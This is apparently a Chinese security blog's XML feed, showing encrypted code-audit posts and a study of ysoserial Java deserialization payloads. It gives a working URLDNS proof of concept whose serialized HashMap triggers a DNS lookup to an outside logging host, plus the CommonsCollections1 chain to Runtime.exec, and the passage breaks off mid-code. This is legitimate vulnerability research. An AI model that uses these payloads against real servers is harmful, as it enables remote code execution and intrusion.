11cc37cd9e75c226494178183e7ad708920d9e76698821d65e4d4938fe04ef357604891e8a6c26799d7006cfa6ef8a305cd0b36a3e8341e1b3e08362ad3af23cfd6289210dfe02381d2c398f437b6abee68225887846b736019de61fe29b1ee2e8f6aa59bc30ab5f9e097f4c51dabd7396c96f24d2ea80d2ba088e67af13688fb18f746331254444185172b9f3d854a8392761e6331a3ea22d0eeb68343de4a711d5bba46fc599ed41194e480f8bad90d6d75732b22579d11f6ee644aad56545269193cf0b22ed2743ccf944f2838f980ee001062b5a238b81780177762e249d11d5c02a58698ec7393c512dc2f929788c0a699251a8fa4e49c7f9b68af2579dc9a63772a24bedf799e7d2154f48fc1d812800a53201626a1c0f1164f13dabb1a33fb1af1b553ad166ee613d317d8e10d2d20ecadea5b765db8bf1729932989578e3c1b24010d8c68d63f118fa4ac2bc571f9e0b919e7005e9b311bb6fd7eb952f0dfe27b7ab11782232a8dda28ebc87ba30e20b4d30e79a6b138f87f38e43022f10aeb27b2ef6c26ed96ea1a2b0e3a52c45905bd11e7c405243b1290a4fe00eb47752e3e44dbf4a07470769abf917ba1f4eba9f8b5e7450a887e3f9e4c61e2577dd27fb8e8d8f7be4b8483131bc8e431510c2b0788dc512c5fc9ca542c711dd047dadd483a16f068d42d0790c3bb091186230784d46f38df2f3cf4c690d5f662ae207aadabe5517661c4e31d49d00fc18eb07c8216024c491b7052bc1563d738720e4e910876c97e764a1cc1d86997c65246ceec12f54692b9e696915953ff7a26cbeab0c835cb0a5bfb390e8d50cf6a49560a5207e3a9318afd39d00cd2964b5d86a264d8cd73fa7a4e30d99cf578e017a469521fda4bb9d2509d59bcff968d4c6f77ac9845a092c951b6d41c5ae5b62d9c3df8c85e3faa84ae0954938ea723843ac82f461f9d6ac0d9df83834680c198ceee78711b6c37d7eb850fa5f7bc411c0f740c34c1b627fe376ebf112caafb3bce0257b91876db95ae139db9a6fda9fe2299ec68657c29768da6cce97f906ef178dd5844c01aa0275fbf41fac841f8ab158f3436330980a259916af895f63175937e16c315342f2bd8ee9086f5c8185f4cea47adcb41d16c8ff4561b575e9e896696b2cf84ba0e098ff3f03e782a75ad144264a7855d7929fc578cb9d1fcd25fe4876aaba237afdaf08ae5e5509a1df04e2a9ee7dc77fdf82af3c39f930fbe1907320e579e813481112e2e39a906709cda99db9fb13528b03e99d8007177820b36006d2906d7310486393f27f27ce649a043ddd4d4931d6aca9b9a7a7cb899976e4d857ff34183d2bdb5288c9ae7c9823e1a869a42c5e2cfd818718271fe0c2992a77d4528232584443070fef3e2ecf0b644438209d8b33da27506a6f062757ea5f6f945fc8e6c05a4fcf7bde677b8db6c838e86009c9ceb47b4ac24f870cd785e83f417498611f1ba968abeb31ddab69dd88aad6baea75df2003c9e92fb0db32af922a2be67817bc1f16d72bddf3bbf8d18803e51ad05979621bb394584c44254a2529b94805ebf1535c1d3e6eb379bc8064d4e4a8aeb6604beb30af17a599d7e8a55a5369d72c96dc7ac958fdbc797706edb89a0194472edfe39eda7992e3e2848f06630cd5c328e15b9f1238b4d1892fc7f300d56d7c94b308a10d100840cdccb242f2107ddcce6f0610c990aea4dc28d3a59e11dc4ee3ca07b018aadb2796d98836306d6d5003bd9f9afaf077c65aceab845f20d1696e53b5562423205c534e545461d203c152e899dfad62e4704ea713dc1863a06c1b50475f493aa62e23a04414df7a16bdc8a778ce51d58124b46517f5f5140a9170b5986a94038cedfd29c2e02ef18cfe9a6d22b5fc04aefe352eeb08845116b2219cf340f5c698ad22beae055a5ea175827819a7caf1bd889dd51415859cdea9e988ff07774fd9cded4aba54912f8776af8e78e8372ae9d6ebabb9f671e9387b3eae9035c765e6b08e615da3a93edb3498e23bad2953de2b80be187d27d44bc5845798a10473a2b52d7474138bbed72bb09e532ac19bf63206826356de562428270987614241135dfaa5652416072f6426b82fafceae64170520f67f6218e4900d134e5e847210dadae77f775ceb8ad6fa8a39512f2f7c626ba6e14270d0b2da9638e79f6fff6e674d2b249bfce6670d264fb46cc664c376d4d256b2aa46c66d6ac87b6481547daa007eeb3f99240e4536c62ea27691ab643c4622cb68b0080f67f60325e4d26147753e4f9525d92468c57a8d0aaa42b4093b1f39363f6d0821182b431b83570eb6ca13f017e68b145419713f640276e23b137ed0d98d369aaa17419469976503b74f89102248cc2d759bc82faf5d11ef32de3533f5a3887306df5c273e81072781aa270bb3f04c4d61bbf6a54f4fe8111145227c1a2633ebab9c623d1503471335846ebf7806731b064bd6832d68159116d56ac23be1f79f7b5fa3447dd565399682ea0b9e477b1bc8490409607fdf1b850a7b07f97c43f9ada7b43680cdbd30fc0d45b064617689f5a43e91ae0162aeae7218b1b55f65e8183deaa0749e216818fbb8f1fe2f649ec2d307c429359320b4a3dd951916a78d61067fb9791d1f674590b22dc11704cc811733e0c1b89b6f1c028ba05b65b32e07528e0c5cf928ae4865d217895d67901001883c33d61fa0db8132c415bba7b971ae4f571f4863dee59a3b009c8fc2607ecb8fde9a27c71c05fa39cfa9173526422f4c6478c695d8d64b6425d84bd4b4cab73faca724efeb9df2dadfcaa55410a5c778e4c9c0f78bb4356af2540fddaf6471a469553cc0deaf33dadcf625524f12864229c1116bd027b6f4a53ad915219e246db4bb51ae6d0fa0ad92530de96d40abaa4fe264afd2a493c04a87b422bf246f73b63b88f4c7e55ffe8faf88ed1f0f73431f75e67e61141522314022c0fc85f7401e16f8524b74483a8de5168628488058da0945f60695b22f29d678dcf63f3f282261e52821bc2e30d3c175adab21a882feff5e0e9e1682c77aafba389b95785e9d90abd2faf312b143c71ce52c04da716219e8acdcbabdd105b91c4507846581245bfc9f2661dcb2fba1afd1b881c3da1f5e8b13919850a27d23cad53d4792ff8033cf5f487706040b3bdfc3a0f1722d67abc629413a9a68baf1d139834eedce1b15b6217ab0a4a9582977b465e77987652e2683de91a0552e447e27748a6462a9e05fb3577c36e194982d93231d27372e7d09eef71c366f17258d7f2b4826d4ae38fea28c120d53db603486382d137d4f508720e96d6a9994cf33dcc4bc0e2a9f4e75a38cf235c7dd92ef406bb6245de81375425d3e905f37734ca2c9b3899b8923f88537b4fb31b1b963b732f106e93e34a0c16225fa2ce5f35e09dbdd15a4043efa78fe00cb7901497e6e8acbe0fc77747b4a3f9be42ea742523d98b28a4b383943fc603e0ef1c025b2310cb1894b94f5707e50ee62c262d8d0d2eb1dbe2a85a0bad46f24ee6f7262072b934f3a8cfb738a657955e57e4870cee538c91da52f9e46f12256c29e0145255180f04821a31cf659cbcc90f9c5f295092579ae5b5f08e2eeb3bb2651a4a9070dc32c5ef77d3d0e6e719b006695f1445b429be3db464f3c0d93d844346d6375213cce72b0d9db5ab77623e73ab83169e5fb059acf2a6ace4156ac77f2451a142d238bb47804dfc8e3f8aaf19e68ce3cc94f462ce02a0257db10eb37316d6ee8438b54060b3e3b7a041ef47d8d3360febdd4992ab790fc7a54381e2b807f54cea3de71a9221c8101c4fc56fdfe0fc33d3b7d0dc852e7801374a1880867a4317a94e20bdc33531dbb08c2f5782552fe6d08aa5df822b12d8fdb78041a0a78233b57302f1a121c91080fe4e162842442249ab4fe40df7e3443015c63c7b24ffb5203a22e809b8595fc9d7a2e2504531b219556350ca21c3af1b67c5754746433b6de8de844739a062b2ffa7a29ef73161d64d4a8e3ec35bc632f9d2a91ed7ac50398df4a819d90cd4e22035a664fe59709721bea1b33efc81e14735dc9ef971ac8fc73a655914cfa652ea177857a01a85289eeb61474cb43e09782ada206eb215ce15b5dcfc8bec959fed1cce78e03ece46d81c51cd74ab142517f983d366afec0660a3fbc8edc08ddc64322ac6c726cb3ed13ada1a59da5b3be8b90eb4b90fe86d4d6dbb9b88f6f8417aa6a16126f0e4309b43abfaa47c6647329359ca0aa225f6926e301f1ba744014a90702fa1c3beb0e568d7064c431ed879a72024c67b3824338a90e56282626c52e98d5067e6f9af6f463cd27cc2f80819cf6f2b4842c547fda71e91efe7f9f3720f9c317cdbc313420e1b50401a6ff096f8cf15ee0ca43b39dcbb4f5cd37c747e2dde3a40a3ad59dd8ed713417aca58100caeba81030040daa9f9b7443195738ac1810ebe902c8a682cc9d8821c07bc3ea3df17ceb190ed4525230c016114f05b591272e92c06a02f356db8b29b8b0ce215c4bc0ed74fe60639e632930e712369f867f3ecdab8a95f5efa8c62dd87c90eedd2a96e31911f6fc1ae8eb99657292a6d1aaead3d12b8b60067c3f06a0173063954576150ea406e95e1e19dc69380b28c46057d3673d4038c3e427851f1721283f9522c74d0883254eb3e12ebb2e9b69620ed8e30f239aae792606afd726cd5f493a34ae98d1eb44ce81a07327da1d19c1742ebe89968546270c4da3b15eebf559bd2b742f75f33fa55515e2d6b10c498d5a1b641065febb37d3794bd8295bdf7b66729a64118c10298eab2bfd4de2e081a8c2af7de10230609d8dc7dbcefaef9f0e244783b07c3e15cf056fd5a47c54b1ce2e555f58b1e11d4bd502c556fdaffd3744fce7e1719888f84219886ce055e03251699f78c25b1ba3ab1908a2f7843c3b414b2de6061b4d0749734accdecb1c885a91e053d4685acd52a7f2424aff1e2aa26816379fe2868aceee9b5bb4119152caf20860201aed5a52f60c31730b6be35256c04353f00f9789f3acaae0ab8319ddc7dd55276134fbb7dcf3166c39043b9869a3a593c7a36d4ecb9a419f0e9e3356d37ec8b3e47ed2feebcbb8ccaaca17221f6057486eb127167201cb32b791b55d72d413185c880b9993822b4e350e556df0f6381901b8d1256ca7046554cf6b0a1f1a5adc54015da81f4a486a8bb018c5240294bb2d7455d73d2bc160c40400e114a13c6b77e33c92e87b97a9b15198231dec26311a0160395b7cd3e9ee45b644751dcf1bca5f29462b0fad1bfc3cecf384720d24ca9595d127e7b071914e75ff49e9900b1b728d331f29fdd0e4ad74e694c50f2b0bf84332e3d049d1a8e8cd260f39e2496ea77fa2e445f8059e8a1b12254f58223d1d6e54d052de393679843e8555a6873beef1c9ef0dcd265a8d21a20149c0a99d9f3f35828b427a7e389d0b1941b2c4960914477af1fb6b1799a22ad4db37614a6ac2cb55bc631dca752b59b7b062f3a2382cd4f2fb70f813cf77e1bfad549232b919a01c14cebdfba8220740175c386dce982a58a9a525aa13522fbf74cced3bde9bd2b36a214601ff8317710ff6e13f794d99edccedab2e6c91467df3b1a781a3818248261029dba6eadb103a2d500a97c6b7891a376f000212755722486835dc757b3c678ae7863e6312476140214b782b28e51ad34adfd122ec7f5c78868576179f4a6ba9bdbedff663691bbb3e729c29640fb60d017c0a95ced3d825dd25ff24eb79a3515fca8882ae5364cb987b83ffd3a8cde19723e61250003e75e24b8df45a31595c2fb53f04a25e736e9e0471342284c7224e20a9b590dd7c7633b56838d82510594abed02855adcb2bab42675a7b8a83fa2d39f49dea3d9c968026b1a9aa47c3fda33941a67920f124a6fc667299115df60eb853843cc190b8f4073408f9c5047ef2aebae72877d554973b427fc8f2f001fa4a82e791cbc9fd673b9e836312b12d1a4ba925553840f4eae590832f79eb697d2f4447360973d970dcd70055ea352d84e37c14ea8cb8c79409465541c5f3ab732e808b471a66fb6d8b59c0ad762bab42ccebaa1d530579c6c2bf90e017ad42a985550666e35ef64807fd1062108684cff30dd8bca4d7d2f1e339ec32dc86ba0d5fd944464379bea5e2af90a1ae98029eeb1f09ed00002d1c04a4cb83aa13d770f9b3269fe0b9b8c46ac6d4e8ca7f9fa1a86a3d11ff28ebe31c6b911d4df411c2a4a8ece99b18e1264ef69f3b2cb4036dee9e7c98632ee8db0fb2507f6989934566789dad9de370bc43daea4ef8289c1a9bad2b0374226d27d0681807e5cf8109c617cae5848b00a2a85fb8b1688053ff7562493313f7f154f1cfe8f5d9eab58be488e3e557a21f3321fd666bac9884d48e9a33a44aa5cdb617126f7fa536887f761be64ecd6ae09eabe1c38c16174f42be2eccbce6d79cd6a89c8e26048b31581d2781877cae71b3c63acb143f53133ccd9518b162ab5eb8be53c54e41be707fbdcfb6ca773fafabd27ed21c6a778ed76ac33206f884cf28ffd0892d1d720c5c5060c454e10df5522f0266bb82e1cbd953eb5693c6400f86ac4785ddb9958d30682a1a737809614cd0f5efb23f3ecaacd006537fb22dc7b3747251c2ae7d64583532127a3c74cfcb53f9afabd1a024f6f1b5d3d3b0248fbf9e76a42be2640ecd75194a4ff71a35e10b484330d253801384bf8c2223b07bff6c655</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>金山终端V9</title>
    <link href="http://example.com/2022/01/17/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AFV9/"/>
    <id>http://example.com/2022/01/17/%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AFV9/</id>
    <published>2022-01-17T22:55:45.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5a867e249aa4a4119116eeb710fee7d6d14a27391c51ae13c25a625288cd13e3"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserial Payloads Study</title>
    <link href="http://example.com/2021/12/01/Ysoserial-Payloads-Study/"/>
    <id>http://example.com/2021/12/01/Ysoserial-Payloads-Study/</id>
    <published>2021-12-01T13:59:59.000Z</published>
    <updated>2024-03-05T09:46:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS经常用于快速检测反序列化漏洞是否存在的链，因为使用的原生类没有jdk版本限制。</p><h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>通过利用链一点点分析首先是<code>HashMap</code>,反序列漏洞首先要执行<code>readObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重点在于方法中最后的<code>putVal</code>方法中调用了<code>hash</code>方法<br>而在<code>hash</code>方法中又调用了<code>key</code>的<code>hashCode</code>方法，而<code>key</code>是<code>HashMap</code>中可以put写入的对象。<br>这时再看<code>java.net.URL</code>中的<code>hashCode</code>方法<br>在此方法中又调用了<code>handler</code>对象（<code>URLStreamHandler</code>类）的<code>hashCode</code>方法<br>进而执行了<code>getHostAddress</code>方法，此方法中触发了DNS请求</p><p>接下来回到<code>HashMap#readObject</code>：<br>其中的<code>key</code>是通过<code>readObject</code>获得，那么在<code>writeObject</code>时必然会将<code>key</code>写入。<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16044782636540.jpg"                        alt="-w682"                 ><br>在<code>internalWriteEntries</code>方法中，<code>key</code>和<code>value</code>是通过遍历<code>tab</code>遍历写入的，而<code>tab</code>则是<code>HashMap</code>中<code>table</code>的值，，<code>table</code>的内容是由<code>HashMap#put</code>传入的，在<code>HashMap#put</code>方法中也会对key调用<code>hash</code>方法，这时会产生一次dns请求。<br>检测反序列化漏洞存在，是要判断在反序列时是否进行了dns请求，所以在序列化对象时并不想进行一次dns请求从而误报。<br>回过来看<code>URL#hashCode()</code><br>只要<code>hashCode</code>属性的内容不为<code>-1</code>就不会进入到<code>handler.hashCode</code>方法，也就不用触发dns请求，所以在<code>HashMap#put</code>之前修改下<code>URL.hashCode</code>的值不为<code>-1</code>即可。<br><code>hashCode</code>为<code>private</code>需要在获取filed后设置<code>setAccessible</code>为<code>true</code>。<code>put</code>后需要修改为<code>-1</code>避免影响反序列化的流程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://des.3z5yg9.tweb.email&quot;</span>);</span><br><span class="line">        <span class="comment">//反射修改hashCode</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(url,<span class="number">123</span>);</span><br><span class="line">        <span class="comment">//打印修改后的hashCode</span></span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        hashMap.put(url,<span class="number">123</span>);</span><br><span class="line">        <span class="comment">//恢复hashCode</span></span><br><span class="line">        field.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.obj&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="comment">//反序列化操作</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./ser.obj&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">            inputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>ysoserial</code>的payload里使用了子类继承<code>URLStreamHandler</code>重写了<code>openConnection</code>以及<code>getHostAddress</code>方法在<code>put</code>时直接返回null<br>那么再反序列化时为什么还是可以进行DNS查询呢，答案在<code>URL</code>类中<code>handler</code>被关键字<code>transient</code>所修饰（在进行序列化的时候，此关键字修饰的成员变量，不进行序列化的操作），所以最终<code>handler</code>还是初始类型<code>URLStreamHandler</code>。</p><h2 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h2><h3 id="Commons-Collections1"><a href="#Commons-Collections1" class="headerlink" title="Commons Collections1"></a>Commons Collections1</h3><h4 id="Gadget-Chain-1"><a href="#Gadget-Chain-1" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>先看利用链的后半部分<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16062134498670.jpg"                                        ><br>**<code>InvokerTransformer</code>**¡<br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16062155662942.jpg"                        alt="-w1087"                 ><br>利用反射来执行某个类的方法<br><strong><code>ConstantTransformer</code></strong><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16062219623753.jpg"                        alt="-w734"                 ><br>此方法会将传入的对象原样返回</p><p><strong><code>ChainedTransformer</code></strong><br><img                         lazyload                       alt="image"                       data-src="http://syncoss.oss-cn-beijing.aliyuncs.com/2020/12/29/16062223019298.jpg"                        alt="-w843"                 ><br>这三个类结合到一起就可以执行任意命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayloadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">//相当于执行 Runtime.class.getClass().getMethod(&quot;getMethod&quot;, String.class, Class[].class).invoke(Runtime.class,new 